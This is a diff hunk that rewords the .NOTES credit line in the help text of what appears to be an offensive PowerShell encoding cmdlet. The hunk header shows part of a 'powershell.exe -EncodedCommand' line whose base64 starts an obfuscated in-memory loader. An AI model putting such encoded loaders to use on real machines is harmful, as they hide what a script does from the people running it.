@@ -55,7 +55,7 @@ powershell.exe  -EncodedCommand cwBhAGwAIABhACAATgBlAHcALQBPAGIAagBlAGMAdAA7AGkA
 
 .NOTES
 
-This cmdlet was inspired by createcmd.ps1 script presented at Dave Kennedy and Josh Kelley's talk - "PowerShell...OMFG" (https://www.trustedsec.com/files/PowerShell_PoC.zip)
+This cmdlet was inspired by the createcmd.ps1 script introduced during Dave Kennedy and Josh Kelley's talk, "PowerShell...OMFG" (https://www.trustedsec.com/files/PowerShell_PoC.zip)
 
 .LINK
 
